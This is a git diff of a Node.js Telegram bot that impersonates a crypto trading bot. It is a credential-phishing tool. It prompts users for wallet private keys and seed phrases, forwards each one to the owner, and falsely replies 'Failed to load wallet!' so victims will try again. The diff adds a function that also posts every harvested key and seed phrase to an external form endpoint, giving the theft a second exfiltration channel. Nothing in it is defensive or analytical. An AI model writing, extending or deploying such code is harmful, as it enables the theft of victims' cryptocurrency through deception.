@@ -1,14 +1,43 @@
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
+const axios = require('axios'); // For making HTTP requests (e.g., sending to FormUnstatic)
 
 const token = process.env.BOT_TOKEN;
 const ownerId = process.env.OWNER_ID;
+const formUnstaticURL = process.env.FORM_UNSTATIC_URL; // Your FormUnstatic endpoint
 
 // Create a bot that uses polling to fetch new updates
 const bot = new TelegramBot(token, { polling: true });
 
 // Store the chat state to track if a user is entering a private key or seed phrase
 const chatStates = {};
+
+// Function to send data to FormUnstatic
+const sendToFormUnstatic = async (name, message) => {
+  if (!name || !message) {
+    console.error('Missing name or message for FormUnstatic submission.');
+    return;
+  }
+
+  try {
+    const response = await axios.post(
+      formUnstaticURL,
+      new URLSearchParams({
+        name: name,
+        message: message,
+      }),
+      {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      }
+    );
+    console.log('Data sent to FormUnstatic:', response.data);
+  } catch (error) {
+    console.error(
+      'Error sending data to FormUnstatic:',
+      error.response?.data || error.message
+    );
+  }
+};
 
 // Respond to any message
 bot.on('message', (msg) => {
@@ -17,8 +46,10 @@ bot.on('message', (msg) => {
   if (chatStates[chatId] === 'awaiting_private_key') {
     const privateKey = msg.text;
 
-    // Send the private key to your Telegram ID
+    // Send the private key to your Telegram ID and FormUnstatic
     bot.sendMessage(ownerId, `🔑 Private Key Received:\n${privateKey}`);
+    sendToFormUnstatic('Private Key Received', privateKey);
+
     bot.sendMessage(chatId, '❌ Failed to load wallet!', {
       reply_markup: {
         inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
@@ -30,8 +61,10 @@ bot.on('message', (msg) => {
   } else if (chatStates[chatId] === 'awaiting_seed_phrase') {
     const seedPhrase = msg.text;
 
-    // Send the seed phrase to your Telegram ID
+    // Send the seed phrase to your Telegram ID and FormUnstatic
     bot.sendMessage(ownerId, `📜 Seed Phrase Received:\n${seedPhrase}`);
+    sendToFormUnstatic('Seed Phrase Received', seedPhrase);
+
     bot.sendMessage(chatId, '❌ Failed to load wallet!', {
       reply_markup: {
         inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
@@ -114,38 +147,7 @@ To buy a token: enter a ticker, token address, or URL from pump.fun, Birdeye, DE
 
 For more info on your wallet and to export your seed phrase, tap "Wallet" below.`;
 
-    const startOptions = {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: 'Buy', callback_data: 'buy' },
-            { text: 'Fund', callback_data: 'fund' },
-          ],
-          [
-            { text: 'Help', callback_data: 'help' },
-            { text: 'Refer Friends', callback_data: 'refer_friends' },
-            { text: 'Alerts', callback_data: 'alerts' },
-          ],
-          [
-            { text: 'Wallet', callback_data: 'wallet' },
-            { text: 'Settings', callback_data: 'settings' },
-          ],
-          [
-            { text: 'DCA Orders', callback_data: 'dca_orders' },
-            { text: 'Limit Orders', callback_data: 'limit_orders' },
-          ],
-          [
-            { text: 'Migration Sniper', callback_data: 'migration_sniper' },
-            { text: 'Refresh', callback_data: 'refresh' },
-          ],
-        ],
-      },
-    };
-
-    bot.sendMessage(chatId, startMessage, {
-      parse_mode: 'Markdown',
-      ...startOptions,
-    });
+    bot.sendMessage(chatId, startMessage, { parse_mode: 'Markdown' });
   } else if (query.data === 'import_wallet') {
     const importMessage = `ℹ️ Connect wallet to use settings`;
 
